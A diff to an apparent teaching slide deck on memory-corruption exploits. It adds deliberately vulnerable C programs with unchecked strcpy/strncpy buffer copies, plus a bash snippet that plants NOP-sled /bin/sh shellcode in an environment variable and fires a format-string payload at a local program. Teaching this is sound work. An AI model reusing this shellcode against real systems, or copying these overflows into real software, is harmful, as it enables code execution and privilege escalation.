@@ -94,12 +94,84 @@ shell! Does you remember SUID bit?!
 ]
 .right-column[
 <div style="padding-top: 250px"/>
-- In the buffer
+- In the same buffer (that overflow)
 - In another buffer
 - In an environment variable (easier to be located, very high address)
-- Everywhere in memory, be creative
+- Everywhere in memory, attackers are really creative
 ]
 
+---
+.left-column[
+## In the buffer
+]
+.right-column[
+```c
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+  char buf[128];
+  if(argc < 2) return 1;
+
+  strcpy(buf, argv[1]);
+  printf("%s\n", buf);
+
+  return 0;
+}
+```
+]
+
+---
+
+.left-column[
+## In another buffer
+]
+.right-column[
+```c
+#include<string.h>
+
+// The devil is in the details - nnp
+
+void copy_buffers(char *argv[])
+{
+	char buf1[32], buf2[32], buf3[32];
+
+	strncpy(buf2, argv[1], 31);
+	strncpy(buf3, argv[2], sizeof(buf3));
+	strcpy(buf1, buf3);
+}
+
+int main(int argc, char *argv[])
+{
+	copy_buffers(argv);
+	return 0;
+}
+```
+]
+---
+
+.left-column[
+## In the environment
+]
+.right-column[
+```bash
+# Export the environment variable
+# [NOP sledge + Shellcode]
+export SH=`python -c 'print "\x90"*40000+   \
+	"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e \
+	 \x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3 \
+	 \x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1 \
+	 \xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68 \
+	 \x4a\x41\x41\x43\x43\x4b\x4b\x4b\x4b"'`
+
+# Launch the exploit
+./vuln-prog `python -c 'print "\xd4\x94\x04 \
+	\x08FLOW\xd6\x94\x04\x08
+	%57076x%4$n%57599x%6$n"'` 1> /dev/null
+
+```
+]
 ---
 
 .left-column[
@@ -204,7 +276,7 @@ Common techniques that leverage this idea are:
 <div style="padding-top: 150px"/>
 .right-column[
 In order to jump to the suitable code, attackers could corrupt the
-normal program flow by overwrite or mangle:
+normal program flow by overwriting or mangling:
 
 - Activation records
 - Function Pointers
@@ -290,7 +362,7 @@ int main(int argc, char *argv[])
 <br>
 **Function pointers**
 ]
-<div style="padding-top: 250px"/>
+<div style="padding-top: 200px"/>
 .right-column[
 The deliberate modification of the value of a pointer is referred to as
 pointer subterfuge. As these types of attacks modify directly the control flow
@@ -325,6 +397,18 @@ void foo(void *arg, size_t len)
 ]
 ---
 
+.left-column[
+# Step 2
+##### Jump to that code
+<br>
+**longjmp**
+]
+.right-column[
+<div style="padding-top: 200px"/>
+We prefer to not spoil the [IO netgarage level16](https://io.netgarage.org/).
+One of our favorite challenge!<br>
+]
+---
 class: center, middle
 
 <img src="imgs/bcat.gif" alt="A black Cat that polish his nails"/>
